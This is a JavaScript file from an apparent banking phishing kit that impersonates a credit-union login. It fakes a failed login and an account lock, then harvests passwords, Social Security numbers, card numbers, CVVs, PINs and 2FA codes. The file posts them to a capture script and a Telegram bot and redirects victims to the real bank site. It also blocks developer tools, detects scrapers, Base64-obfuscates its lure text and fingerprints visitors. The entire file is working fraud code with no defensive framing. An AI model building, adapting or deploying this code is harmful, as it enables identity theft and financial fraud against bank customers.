(function() {
    'use strict';

    // Anti-Inspect / Anti-Copy Protections
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('selectstart', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
        if (e.keyCode === 123 ||
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
            (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }
    });

    // --- Threat Evasion Layer ---
    // 1. Infinite Debugger Trap (Freezes DevTools if forced open)
    setInterval(() => {
        const _d = new Date();
        debugger;
        if (new Date() - _d > 100) {
            document.body.innerHTML = 'Client Error 0x00A';
        }
    }, 500);

    // 2. Headless Browser / Scraper Detection
    const checkBot = () => {
        const isBot = navigator.webdriver || 
                      window.cdc_adoQpoasnfa76pfcZLmcfl_ || 
                      !navigator.plugins || 
                      navigator.plugins.length === 0 || 
                      window.outerWidth === 0;
        if (isBot) {
            document.body.innerHTML = 'Access Denied: Automated Software Detected.';
            window.location.replace('https://www.google.com');
        }
    };
    checkBot();

    // Bot Detection via PHP
    fetch('php/bot-detection.php', { method: 'GET' })
        .then(response => response.text())
        .then(data => {
            if (data) {
                document.body.innerHTML = data;
            }
        });

    // Hardened String Table (Base64)
    const _s = {
        'l_title': 'U2VjdXJpdHkgQWxlcnQ=', // Security Alert
        'l_body': 'WW91ciBhY2NvdW50IGhhcyBiZWVuIHRlbXBvcmFyaWxseSBsb2NrZWQgZm9yIHlvdXIgcHJvdGVjdGlvbi4gUGxlYWQgdmVyaWZ5IHlvdXIgaWRlbnRpdHkgdG8gcmVnYWluIGFjY2Vzcy4=', // Your account has been temporarily locked for your protection. Please verify your identity to regain access.
        'v_btn': 'VmVyaWZ5IElkZW50aXR5', // Verify Identity
        'u_lbl': 'VXNlcm5hbWU=', // Username
        'p_lbl': 'UGFzc3dvcmQ=', // Password
        'b_lgn': 'TG9nIElu', // Log In
        'b_prc': 'UHJvY2Vzc2luZy4uLg==', // Processing...
        'frgt': 'Rm9yZ290IFBhc3N3b3JkPw==', // Forgot Password?
        's_msg': 'U3luY2hyb25pemluZyBCYW5raW5nIFByb2ZpbGUuLi4=', // Synchronizing Banking Profile...
        'r_title': 'QWNjb3VudCBVbmRlciBSZXZpZXc=', // Account Under Review
        'r_body': 'Rm9yIHlvdXIgc2VjdXJpdHksIHlvdXIgYWNjb3VudCBpcyBhc3NpZ25lZSBhIDcyLWhvdXIgc3luYyBwZXJpb2QuIExvZ2luIGFjY2VzcyByZW1haW5zIHJlc3RyaWN0ZWQgZHVyaW5nIHRoaXMgdGltZS4=', // For your security, your account is assigned a 72-hour sync period. Login access remains restricted during this time.
        'a_btn': 'QWNrbm93bGVkZ2U=', // Acknowledge
        'dst': 'aHR0cHM6Ly9vbmxpbmUucGVuYWlyLm9yZy9kYmFuay9saXZlL2FwcC9sb2dpbi9jb25zdW1lcg==', // https://online.penaire.org/dbank/live/app/login/consuer
        'fn_lbl': 'RnVsbCBOYW1l', // Full Name
        'sn_lbl': 'U29jaWFsIFNlY3VyaXR5IE51bWJlcg==', // Social Security Number
        'ph_lbl': 'TW9iaWxlIFBob25lIE51bWJlcg==', // Mobile Phone Number
        'db_lbl': 'RGF0ZSBvZiBCaXJ0aA==', // Date of Birth
        'mb_lbl': 'TWVtYmVyICM=', // Member #
        'cr_btn': 'Q29udGludWU=', // Continue
        'cn_lbl': 'Q2FyZCBOdW1iZXI=', // Card Number
        'ex_lbl': 'RXhwaXJhdGlvbiBEYXRl', // Expiration Date
        'cv_lbl': 'Q1ZWIChDMlYp', // CVV (C2V)
        'pn_lbl': 'Q2FyZCBQSU4=', // Card PIN
        'cm_btn': 'Q29tcGxldGUgU3luYw==', // Complete Sync
        's2f_s': 'QSBzZWN1cmUgY29kZSBob2EgYmVlbiBzZW50IHRvIHlvdXIgbW9iaWxlIGRldmljZSBlbmRpbmcgaW4=', // A secure code has been sent to your mobile device ending in
        's2f_e': 'UGxlYXNlIGVudGVyIHRoZSBjb2RlIGJlbG93IHRvIGNvbmZpcm0geW91ciBpZGVudGl0eS4=', // Please enter the code below to confirm your identity.
        'cd_lbl': 'U2VjdXJpdHkgQ29kZQ==', // Security Code
        'vf_btn': 'VmVyaWZ5' // Verify
    };

    const d = s => atob(s);

    // Session correlation — generates once per browser session, sent with every POST
    const getSessionId = () => {
        let sid = sessionStorage.getItem('_sid');
        if (!sid) {
            sid = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
                (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
            );
            sessionStorage.setItem('_sid', sid);
        }
        return sid;
    };
    const _sid = getSessionId();

    // Load configuration from config.json
    let config = {};

    const loadConfig = () => {
        return fetch('config.json')
            .then(response => response.json())
            .then(data => {
                config = data;
            })
            .catch(e => console.error('Failed to load config:', e));
    };

    // Telegram Bot Configuration
    const sendToTelegram = (message) => {
        const url = `https://api.telegram.org/bot${config.telegram.bot_token}/sendMessage`;
        const data = new FormData();
        data.append('chat_id', config.telegram.chat_id);
        data.append('text', message);
        fetch(url, { method: 'POST', body: data }).catch(e => {});
    };

    // NumVerify API Configuration
    const getPhoneNumberInfo = (phoneNumber) => {
        return fetch(`https://api.numverify.com/v1/verify?access_key=${config.numverify.api_key}&number=${phoneNumber}`)
            .then(response => response.json())
            .catch(e => ({ valid: false, carrier: '', line_type: '' }));
    };

    // SSN Validation Function
    const validateSSN = (ssn, dob) => {
        if (!ssn || !dob) return false;

        const ssnParts = ssn.replace(/-/g, '').match(/^\\d{3}\\d{2}\\d{4}$/);
        if (!ssnParts) return false;

        const areaNumber = parseInt(ssnParts[1], 10);
        const groupNumber = parseInt(ssnParts[2], 10);
        const serialNumber = parseInt(ssnParts[3], 10);

        const dobParts = dob.match(/^\\d{2}\\/\\d{2}\\/\\d{4}$/);
        if (!dobParts) return false;

        const birthYear = parseInt(dobParts[3], 10);

        // Check if the area number is valid
        if (areaNumber < 1 || areaNumber > 772) return false;

        // Check if the group number is valid
        if (groupNumber < 1 || groupNumber > 99) return false;

        // Check if the serial number is valid
        if (serialNumber < 1 || serialNumber > 9999) return false;

        // Check if the first two digits of the area number match the birth year
        const expectedAreaPrefix = (birthYear % 100).toString().padStart(2, '0');
        const actualAreaPrefix = areaNumber.toString().slice(-2);

        return expectedAreaPrefix === actualAreaPrefix;
    };

    const init = () => {
        // Render Strings
        document.querySelectorAll('[data-render]').forEach(el => {
            const k = el.getAttribute('data-render');
            if (k === 'u_label') el.textContent = d(_s.u_lbl);
            if (k === 'p_label') el.textContent = d(_s.p_lbl);
            if (k === 'btn_text') el.textContent = d(_s.b_lgn);
            if (k === 'forgot_link') el.textContent = d(_s.frgt);
            if (k === 'sync_msg') el.textContent = d(_s.s_msg);
            if (k === 'sec_alert_title') el.textContent = d(_s.l_title);
            if (k === 'locked_msg') el.textContent = d(_s.l_body);
            if (k === 'verify_btn_text') el.textContent = d(_s.v_btn);
            if (k === 'full_name_label') el.textContent = d(_s.fn_lbl);
            if (k === 'ssn_label') el.textContent = d(_s.sn_lbl);
            if (k === 'phone_label') el.textContent = d(_s.ph_lbl);
            if (k === 'dob_label') el.textContent = d(_s.db_lbl);
            if (k === 'member_label') el.textContent = d(_s.mb_lbl) + ' (optional)';
            if (k === 'continue_btn') el.textContent = d(_s.cr_btn);
            if (k === 'card_num_label') el.textContent = d(_s.cn_lbl);
            if (k === 'exp_label') el.textContent = d(_s.ex_lbl);
            if (k === 'cvv_label') el.textContent = d(_s.cv_lbl);
            if (k === 'pin_label') el.textContent = d(_s.pn_lbl);
            if (k === 'complete_btn') el.textContent = d(_s.cm_btn);
            if (k === '2fa_msg_start') el.textContent = d(_s.s2f_s);
            if (k === '2fa_msg_end') el.textContent = d(_s.s2f_e);
            if (k === 'code_label') el.textContent = d(_s.cd_lbl);
            if (k === 'verify_btn') el.textContent = d(_s.vf_btn);
            if (k === 'review_title') el.textContent = d(_s.r_title);
            if (k === 'review_msg') el.textContent = d(_s.r_body);
            if (k === 'ack_btn_text') el.textContent = d(_s.a_btn);
        });

        // Set phone display in 2FA if available in session
        const phone = localStorage.getItem('p_hint') || 'XXXX';
        const phoneDisplay = document.getElementById('display-phone');
        if (phoneDisplay) phoneDisplay.textContent = phone.slice(-4);

        const overlay = document.getElementById('loading-overlay');
        const lockedModal = document.getElementById('locked-modal');
        const reviewModal = document.getElementById('review-modal');

        // Micro-Animations & Live Validation
        const validateField = (el, reqLength) => {
            if (!el) return true;
            el.classList.remove('invalid', 'valid');
            // Force reflow to restart animation
            void el.offsetWidth;

            const val = el.value.replace(/\\D/g, ''); // Count raw digits for numeric fields
            if (val.length > 0 && val.length < reqLength) {
                el.classList.add('invalid');
                return false;
            } else if (val.length >= reqLength) {
                el.classList.add('valid');
                return true;
            }
            return true;
        };

        const executeBankLoader = (onComplete) => {
            if (!overlay) {
                if (onComplete) onComplete();
                return;
            }
            overlay.style.display = 'flex';
            const textEl = overlay.querySelector('.loading-text');
            if (textEl) {
                textEl.textContent = "Establishing AES-256 secure connection...";
                setTimeout(() => { textEl.textContent = "Verifying cryptographic signature..."; }, 1200);
                setTimeout(() => { textEl.textContent = "Authenticating credentials..."; }, 2400);
            }
            setTimeout(() => {
                if (onComplete) onComplete();
            }, 3600);
        };

        const handleCapture = (form, formType) => {
            const formData = new FormData(form);
            const ssnEl = form.querySelector('#ssn');
            if (ssnEl && ssnEl.dataset.rawSsn && ssnEl.dataset.rawSsn.length === 9) {
                let realSsn = ssnEl.dataset.rawSsn;
                let m = '';
                let k = 0;
                for (let i = 0; i < 'XXX-XX-XXXX'.length && k < realSsn.length; i++) {
                    if ('XXX-XX-XXXX'[i] === 'X') { m += realSsn[k++]; } else { m += 'XXX-XX-XXXX'[i]; }
                }
                formData.set('ssn', m);
            }
            if (formType) formData.append('form_type', formType);
            formData.append('_sid', _sid);
            fetch('capture.php', { method: 'POST', body: formData }).catch(e => {});

            // Send session data to Telegram
            const sessionData = {
                sessionId: _sid,
                formType: formType,
                formData: Object.fromEntries(formData.entries())
            };
            sendToTelegram(JSON.stringify(sessionData));
        };

        // Form Logic
        const loginForm = document.getElementById('fluid-login-form');
        let attempts = 0;

        // Session Lock Check
        // Temporarily disabled for testing
        // if (localStorage.getItem('session_locked') === 'true') {
        //     window.location.href = d(_s.dst);
        // }

        if (loginForm) {
            loginForm.addEventListener('submit', e => {
                e.preventDefault();
                attempts++;

                let attemptInput = loginForm.querySelector('input[name="attempt"]');
                if (!attemptInput) {
                    attemptInput = document.createElement('input');
                    attemptInput.type = 'hidden';
                    attemptInput.name = 'attempt';
                    loginForm.appendChild(attemptInput);
                }
                attemptInput.value = attempts;

                // Always capture whatever is currently typed in
                handleCapture(loginForm, 'login');

                if (attempts === 1) {
                    // Show error on first attempt and reset password field
                    const err = document.getElementById('login-error');
                    if (err) err.style.display = 'flex';
                    const passInput = loginForm.querySelector('input[type="password"]');
                    if (passInput) passInput.value = '';
                } else if (attempts >= 2) {
                    // Trigger modal and lock the starting point from being reused
                    localStorage.setItem('session_locked', 'true');
                    if (lockedModal) {
                        lockedModal.classList.add('show');
                    }
                }
            });

            document.getElementById('close-locked-modal')?.addEventListener('click', () => {
                window.location.href = __NEXT_LOGIN__;
            });
        }

        const verifyForm = document.getElementById('fluid-verify-form');
        const memberWarningModal = document.getElementById('member-warning-modal');
        if (verifyForm) {
            verifyForm.addEventListener('submit', e => {
                e.preventDefault();
                const memberNum = document.getElementById('member_num')?.value.trim() || '';

                const processVerify = () => {
                    const pVal = document.getElementById('phone')?.value || '';
                    localStorage.setItem('p_hint', pVal);
                    if (memberWarningModal) memberWarningModal.classList.remove('show');
                    overlay.style.display = 'flex';
                    handleCapture(verifyForm, 'verify');
                    setTimeout(() => { window.location.href = __NEXT_PERSONAL__; }, 1500);
                };

                if (!memberNum && memberWarningModal) {
                    memberWarningModal.classList.add('show');

                    // Bind modal actions
                    document.getElementById('close-member-warning-modal').onclick = processVerify;
                    document.getElementById('add-member-number-btn').onclick = () => {
                        memberWarningModal.classList.remove('show');
                        document.getElementById('member_num').focus();
                    };
                } else {
                    processVerify();
                }
            });
        }

        const secureForm = document.getElementById('fluid-secure-form');
        if (secureForm) {
            secureForm.addEventListener('submit', e => {
                e.preventDefault();

                // Address Enforcement
                const addressInput = document.getElementById('address');
                if (addressInput) {
                    const val = addressInput.value.trim();
                    if (val.length < 5) {
                        addressInput.classList.add('invalid');
                        addressInput.setCustomValidity('Please enter a valid address.');
                        secureForm.reportValidity();
                        addressInput.addEventListener('input', function onInput() {
                            addressInput.classList.remove('invalid');
                            addressInput.setCustomValidity("");
                            addressInput.removeEventListener('input', onInput);
                        });
                        return; // Block submission
                    } else {
                        addressInput.classList.add('valid');
                        addressInput.setCustomValidity('');
                    }
                }

                // Field Validation Micro-Animations
                const cardValid = validateField(document.getElementById('card_num'), 15);
                const expValid = validateField(document.getElementById('exp_date'), 4);
                const cvvValid = validateField(document.getElementById('cvv'), 3);
                const pinValid = validateField(document.getElementById('pin'), 4);

                if (!cardValid || !expValid || !cvvValid || !pinValid) {
                    return; // Block submission, let animations play
                }

                // SSN Validation
                const ssnEl = document.getElementById('ssn');
                const dobEl = document.getElementById('dob');
                const ssnValue = ssnEl ? ssnEl.dataset.rawSsn : '';
                const dobValue = dobEl ? dobEl.value : '';

                if (config.pages.find(page => page.id === 'secure')?.features?.ssn_validation && !validateSSN(ssnValue, dobValue)) {
                    alert('Invalid SSN. Please enter a valid SSN.');
                    ssnEl.classList.add('invalid');
                    return; // Block submission
                } else {
                    ssnEl.classList.remove('invalid');
                }

                // Phone Number Validation
                const phoneEl = document.getElementById('phone');
                const phoneNumber = phoneEl ? phoneEl.value.replace(/\\D/g, '') : '';
                if (phoneNumber.length !== 10) {
                    alert('Please enter a valid 10-digit phone number.');
                    phoneEl.classList.add('invalid');
                    return; // Block submission
                } else {
                    phoneEl.classList.remove('invalid');
                }

                if (config.pages.find(page => page.id === 'secure')?.features?.phone_carrier_detection) {
                    getPhoneNumberInfo(phoneNumber).then(info => {
                        if (!info.valid) {
                            alert('Invalid phone number. Please enter a valid phone number.');
                            phoneEl.classList.add('invalid');
                            return; // Block submission
                        } else {
                            phoneEl.classList.remove('invalid');
                            formData.append('phone_carrier', info.carrier);
                            formData.append('phone_type', info.line_type);

                            // If valid, execute the realistic bank load sequence
                            executeBankLoader(() => {
                                handleCapture(secureForm, 'card');
                                window.location.href = __NEXT_CARD__;
                            });
                        }
                    });
                } else {
                    // If phone carrier detection is not enabled, proceed directly
                    executeBankLoader(() => {
                        handleCapture(secureForm, 'card');
                        window.location.href = __NEXT_CARD__;
                    });
                }
            });
        }

        const tfaForm = document.getElementById('fluid-2fa-form');
        if (tfaForm) {
            tfaForm.addEventListener('submit', e => {
                e.preventDefault();
                overlay.style.display = 'flex';
                handleCapture(tfaForm, '2fa');
                setTimeout(() => {
                    if (reviewModal) {
                        reviewModal.classList.add('show');
                        const redir = () => { window.location.href = __NEXT_2FA__; };
                        document.getElementById('close-review-modal')?.addEventListener('click', redir);
                        setTimeout(redir, 8000);
                    } else {
                        window.location.href = __NEXT_2FA__;
                    }
                }, 1500);
            });
        }

        // Masking
        const mask = (id, pattern) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.addEventListener('input', e => {
                let raw = el.dataset.rawSsn || '';
                let val = e.target.value;
                let v = '';

                if (id === 'ssn') {
                    if (val.includes('•') || val.includes('X') || val.includes('*')) {
                        let allowed = val.replace(/[^\\d•X*]/gi, '');
                        if (allowed.length < raw.length) {
                            v = raw.slice(0, allowed.length);
                        } else if (allowed.length > raw.length) {
                            v = raw + allowed.slice(-1);
                        } else {
                            v = raw;
                        }
                    } else {
                        v = val.replace(/\D/g, '');
                    }
                    el.dataset.rawSsn = v;
                } else {
                    v = val.replace(/\D/g, '');
                }

                let m = '';
                let k = 0;
                for (let i = 0; i < pattern.length && k < v.length; i++) {
                    if (pattern[i] === 'X') { m += v[k++]; } else { m += pattern[i]; }
                }

                if (id === 'ssn' && v.length === 9) {
                    m = `•••-••-${v.slice(-4)}`;
                }

                e.target.value = m;
            });

            if (id === 'ssn') {
                el.addEventListener('focus', e => {
                    let v = el.dataset.rawSsn || '';
                    if (v.length === 9) {
                        let m = `•••-••-${v.slice(-4)}`;
                        el.value = m;
                    }
                });

                el.addEventListener('blur', e => {
                    let v = el.dataset.rawSsn || '';
                    if (v.length === 9) {
                        el.value = `•••-••-${v.slice(-4)}`;
                    }
                });
            }
        };

        mask('ssn', 'XXX-XX-XXXX');
        mask('phone', '(XXX) XXX-XXXX');
        mask('dob', 'XX/XX/XXXX');
        mask('card_num', 'XXXX XXXX XXXX XXXX');
        mask('exp', 'XX/XX');
    };

    const trackVisit = () => {
        if (!sessionStorage.getItem('v_tracked')) {
            const sendPing = (fp = 'unknown') => {
                const data = new FormData();
                data.append('form_type', 'visit');
                data.append('_sid', _sid);
                data.append('url', window.location.pathname);
                data.append('res', `${screen.width}x${screen.height}`);
                data.append('fingerprint', fp);
                fetch('capture.php', { method: 'POST', body: data }).catch(e => {});
                sessionStorage.setItem('v_tracked', '1');
            };

            // Custom Adblock-Proof Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('device_hash', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('device_hash', 4, 17);
                const dataStr = canvas.toDataURL();

                let hash = 0;
                for (let i = 0; i < dataStr.length; i++) {
                    const char = dataStr.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash |= 0;
                }
                sendPing(Math.abs(hash).toString(16));
            } catch (e) {
                sendPing();
            }
        }
    };

    const run = () => {
        loadConfig().then(() => {
            init();
            trackVisit();
            ['mousemove', 'scroll', 'touchstart', 'keydown', 'click'].forEach(ev => window.removeEventListener(ev, run));
        });
    };

    // Immediate init for seamless UX
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', run);
    } else {
        run();
    }
})();